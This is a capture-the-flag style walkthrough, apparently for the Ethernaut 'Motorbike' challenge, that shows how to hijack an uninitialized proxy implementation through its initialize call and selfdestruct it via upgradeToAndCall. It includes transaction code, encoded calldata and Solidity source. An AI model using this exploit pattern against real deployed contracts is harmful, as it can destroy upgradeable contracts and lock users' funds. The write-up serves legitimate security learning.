# Answer

Goal: Selfdestruct the Engine contract instance.

Note: Since Cancun hardfork this contract is debatably unsolvable. Becuase of EIP-6780 the `selfdestruct` no longer clears the code at address and only transfers ETH out. Some argue that this can still be workedaround if you interrupt the challenge setup deployment, but in our opinion that is cheating.

What we suggest is using your own local chain like anvil and setting it's hardfork version to shanghai or earlier. This can be done by passing a param `--hardfork`:

```
anvil --block-time 1 --auto-impersonate --hardfork shanghai
```

And later can be verified by using an RPC method `anvil_nodeInfo`

```javascript
{
	"jsonrpc": "2.0",
	"id": 67,
	"result": {
		"currentBlockNumber": "0x4e",
		"currentBlockTimestamp": 1727018600,
		"currentBlockHash": "0xfaca96c96d21e65c86bb5ffc0b1fcad54e3d28f2265e5d473b878d95a3de647f",
		"hardFork": "Shanghai", // <-- Anything earlier than cancun is good
		"transactionOrder": "fees",
		"environment": {
			"baseFee": "0x7512",
			"chainId": 31337,
			"gasLimit": "0x1c9c380",
			"gasPrice": "0x3b9b3f12"
		},
		"forkConfig": {
			"forkUrl": null,
			"forkBlockNumber": null,
			"forkRetryBackoff": null
		}
	}
}
```

So this solution will ONLY work if you have a chain that supports `selfdestruct` with code removal.

## 1. Find Engine address

We know that Engine is going to be stored at `_IMPLEMENTATION_SLOT` so let's see what address is there. The getStorageAt:

```javascript
const contractAddress = '<Motorbike addr>'
const position =
  '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
await web3.eth.getStorageAt(contractAddress, position)
```

## 2. Become Engine upgrader

Though the Motorbike is sufficiently protected, the Engine contract instance - not so much. First we can gain more access by setting `upgrader` to our wallet address.

```javascript
await sendTransaction({
  to: '<Engine addr>',
  from: player,
  data: '0x8129fc1c', // <-- encoded "initialize"
})
```

Since the Engine was only initialized through a `delegateCall` we could still call it directly.

## 3. Destroy the contract instance code

Now that we are the `upgrader` we can call `upgradeToAndCall` with a `SelfDestructor` contract address that contains `selfdestruct` function and pass it as `data` to be called after upgrading:

```javascript
await sendTransaction({
  to: '<Engine addr>',
  from: player,
  data: '4f1ef286000000000000000000000000<SelfDestructor addr>000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000040948ef3c00000000000000000000000000000000000000000000000000000000', // encoded "upgradeToAndCall" function with params: [<Malicious addr>, encoded "byeBye" function]
})
```

The `SelfDestructor` contract looks like this:

```solidity
pragma solidity <0.7.0;

contract SelfDestructor {
    function byeBye() external {
        selfdestruct(msg.sender);
    }
}
```
